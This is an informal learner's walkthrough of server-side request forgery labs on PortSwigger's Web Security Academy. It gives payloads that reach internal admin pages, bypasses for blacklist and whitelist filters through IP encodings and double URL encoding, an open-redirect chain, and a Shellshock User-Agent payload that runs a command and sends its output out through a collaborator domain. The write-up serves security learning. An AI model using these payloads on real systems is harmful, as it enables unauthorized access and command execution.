so this attack happens when an attacker can make the **server itself** perform requests that the attacker wouldn’t normally be authorized to make

for example if there's a functionality to check the stock for a product so it has a request look like this 

```python
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

the API request goes to the other microservice to check the quantity of the product there 

- BUT

what if the attacker makes the request go to another page and get back its content
like 

```python
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

lets solve first lab 
1)go to any product page and click check stock
2)get the request and modify the stockApi parameter to 
stockApi=http://localhost/admin
3)hit send you will find that url in the request /admin/delete?username=carlos

4)if you try to but it in the request normally like you navigating to this page it will give you 401 unothoriezed 

5)put if you modify the stockapi parameter one more time it will be accepted and delete the user cuz it thinks it's a server request 

```python
stockApi=http://localhost/admin/delete?username=carlos
```

2) sometimes it's not from the localhost sometimes it allows a range of ip’s that has the admins ips 

so you should send it like this 

```python
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
stockApi=http://192.168.0.68/admin
```

solving second lab
1)capture the check stock request
2)here it need an ip and a port too 
3)implement the request to be like this 

`stockApi=http://192.168.0.1:8080/admin`

4)send it to intruder and mark the last octet of the ip to brute force which ip is the admin ip that allowed to work
 
5) send the request to delete the user using that ip it will be smth like this 

```python
stockApi=http://192.168.0.60:8080/admin/delete?username=carlos
```

3)black list filters
sometimes theres input filter to prevent ssrf 
the key to bypass this is by trying to type the ip in diffrent ways

- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.

so what you learn from that is `127.0.0.1` is same as `127.1` and `2130706433` and`017700000001`

ip address to decimal version: each ip has a decimal version too so maybe check this one too 

solving third lab 
1) first try to put [localhost](http://localhost) ip 127.0.0.1 didn't work
2) try the other versions too you will find that 127.1 is not blocked and works fine 
3) not try to brute force the directory you will find that /admin is there but blocked
4)try to url encode it (using burp decoder or hackvertor)
5)send the request and still blocked 
6) try to url encode it one more time 
7)hit sent and it works now navigate and delete carlos by this request 

```python
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```

so here the webiste using a blacklist for ips 
and also decode the variable before passing it

4)white list filters
**SSRF with whitelist-based input filter**
on the other hand some websites use white list filters to filter what ips can have access to the server requests

so you can bypass that by using some ways

1)using 
credentials
`https://expected-host:fakepassword@evil-host`

2)using
Fragment `#`

```python
https://evil-host#expected-host
```

3)using DNS hierarchy

```python
https://expected-host.evil-host
```

# And check this cheat sheet for more 
[**https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet**](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

solving the fourth lab
1) get the request and use http://localhost 
it will say "External stock check host must be stock.weliketoshop.net"

so that means it only accepts external requests from this url 
2) try the the credentials method `stockApi=http://username@stock.weliketoshop.net`
`stockApi=https://stock.weliketoshop.net:fakepassword@evil-host`

wont work 
3)try the fragment method `stockApi=http://evil#stock.weliketoshop.net`
wont work also
4)itry to url encode the # and it wont work, encode it one more time and it will work but it will say cannot connect to external stock check service cuz evil isn't a proper url 
5) so use local host instead of evil `stockApi=http://localhost%25%32%33@stock.weliketoshop.net` 

6)then access the admin interface and navigate to delete carlos
`stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos`

5) an open redirect can be used for ssrf attack 

**SSRF with filter bypass via open redirection vulnerability**

solve the fifth lab

1)click on next product btn it should redirect you to the next product page
2)capture that get request and frist test for redirect vuln 
smth like this 

```python
GET /product/nextProduct?currentProductId=2&path=https://google.com HTTP/2
Host: [0a150017033bf03080a9b7ca003600f4.web-security-academy.net](http://0a150017033bf03080a9b7ca003600f4.web-security-academy.net/)
Cookie: session=RsxVIdEkOrNdeupiINlZWBqzr5075KpD; session=xjbs9QEJn0ijChuZnjbCaxCpLYI9L73r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a150017033bf03080a9b7ca003600f4.web-security-academy.net/product?productId=2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

you will find that it redirects you to [google.com](http://google.com) 
3) lets try if it can lead to ssrf
go to check stock request and replace the stockapi parameter with (it should accept the url cuz its in  the website)
`stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin` //you should actually brute force the url and the port and admin directory in the wild but in this lab it gave u the right url already 
4)navigate to admin page and delete carlos

now lets talk about 

Blind SSRF Vulnerabilities

- **Blind SSRF** means you can make the application send an **internal HTTP request** (a back-end request) to a URL you provide, **but you don’t see the response** in the front-end. The server makes the request quietly in the background.
- This type is **harder to exploit**, but sometimes it can lead to powerful attacks like **Remote Code Execution (RCE)** on the server or other internal systems.
- Examples where SSRF might be hidden:
    - **Partial URLs**: The application only uses part of the URL or a hostname you send and completes the rest internally. You have limited control, but there’s still an attack surface.
    - **URLs inside data formats**: For example, **XML** can contain URLs. If the application parses XML, it might make back-end requests, leading to XXE or SSRF.
    - **Referer header**: Some analytics software logs the Referer header and even visits the URLs found there to analyze them. You can exploit this by putting a malicious URL in the Referer header so the server requests it behind the scenes.

**In short**: Blind SSRF doesn’t show you the response directly, but you can still use it to scan internal networks, trigger other vulnerabilities, or even run code on the server if you find the right weakness.

solving lab number 6
**Blind SSRF with out-of-band detection**

1)capture the GET request when you click on view product details
2)the request should look like smth like this 
 

GET /product?productId=1 HTTP/2
Host: [0a5d0072041c47efca66e88c00cf00da.web-security-academy.net](http://0a5d0072041c47efca66e88c00cf00da.web-security-academy.net/)
Cookie: session=VXnisBdsxHoAOAa629hjpcKiGQfV1UcO
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://0a5d0072041c47efca66e88c00cf00da.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

1. change the referer header with you collaborator link 
 should look like this

GET /product?productId=1 HTTP/2
Host: [0a5d0072041c47efca66e88c00cf00da.web-security-academy.net](http://0a5d0072041c47efca66e88c00cf00da.web-security-academy.net/)
Cookie: session=VXnisBdsxHoAOAa629hjpcKiGQfV1UcO
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: [http://quoz69zam0iavklaqra0j8k2gtmlacy1.oastify.com](http://quoz69zam0iavklaqra0j8k2gtmlacy1.oastify.com/)
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

4) hit send then go to collaborator click pull now and get the http request 

solving lab number 7 
**Blind SSRF with Shellshock exploitation**

1. first you check for referer header and user agent and both of them vuln to oob ssrf
2. in user agent you should put shallshock user-agent payload (you can seach for it) 
will look like smth like this 
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
3. and in referrer header put http://192.168.0.1:8080
we will fuzz later the last octect cuz we dunno which ip is white listed

so now your request will look like this 

```python
GET /product?productId=1 HTTP/2
Host: [0a1f00890443fe2b82ca9c4100920067.web-security-academy.net](http://0a1f00890443fe2b82ca9c4100920067.web-security-academy.net/)
Cookie: session=OFsGou24DQuEPFHwbs6Xv7hLsYtHq1Aw
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).hbwqn0g13rz1cb217irr0z1txk3dr4ft.oastify.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: [http://192.168.0.1:8080](http://192.168.0.1:8080/)
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

1. send to intruder and fuzz the last octect to solve the lab

2. after fuzzing go collaborator and click pull now and get the admin name and submit it
